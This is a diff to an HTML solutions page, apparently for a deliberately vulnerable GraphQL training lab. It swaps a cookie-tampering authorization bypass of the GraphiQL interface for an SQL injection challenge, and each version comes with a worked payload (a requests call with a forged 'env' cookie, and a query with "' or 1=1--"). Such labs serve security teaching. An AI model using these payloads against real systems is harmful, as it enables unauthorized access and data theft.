@@ -1,32 +1,28 @@
 <!-- Start -->
-<h3 style="color:purple" id="bypassauthz-igql"><b>Authorization Bypass :: GraphQL Interface Protection Bypass</b></h3>
+<h3 style="color:purple" id="inj-sql"><b>Injection :: SQL Injection</b></h3>
 <hr />
 <h5>Problem Statement</h5>
 <p>
-  GraphiQL is available at the path <code>/graphiql</code> with a poorly implemented authorization check.
+  Pastes can be filtered using the <code>filter</code> parameter and it allows sending raw strings as query filters which are prone to SQL injections.
 </p>
 <h5>Resources</h5>
 <ul>
   <li>
-    <a href="https://cwe.mitre.org/data/definitions/639.html" target="_blank">
-      <i class="fa fa-newspaper"></i> CWE-639 - Authorization Bypass Through User-Controlled Key
+    <a href="https://portswigger.net/support/using-burp-to-detect-sql-injection-flaws" target="_blank">
+      <i class="fa fa-newspaper"></i> PortSwigger - SQL Injection
     </a>
   </li>
 </ul>
-<h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-brokenauthz-igql')">Show</button></h5>
-<div id="sol-brokenauthz-igql" style="display:none">
-  <pre class="bash">
-# Beginner mode
-
-# Cookie 'env' stores a string with an instruction to disable graphiql. altering the value to contain graphiql:enable will bypass the protection
-
-# Alter the env cookie to change "graphiql:disable" to "graphiql:enable" to bypass this check:
-requests.post('http://host/graphiql',
-  json={"query":"query IntrospectionQuery{__schema {queryType { name } mutationType { name } subscriptionType { name }}}"},
-  cookies={'env':'graphiql:enable'}
-)
-
-# Expert mode
-# GraphiQL interface is disabled.</pre>
+<h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-inj-sql')">Show</button></h5>
+<div id="sol-inj-sql" style="display:none">
+<pre class="bash">
+# The filter parameter of the pastes operation allows escaping the SQL command and inject a SQL payload
+query {
+  pastes(filter:"aaa ' or 1=1--") {
+      content
+      title
+  }
+}
+</pre>
 </div>
 <!-- End -->
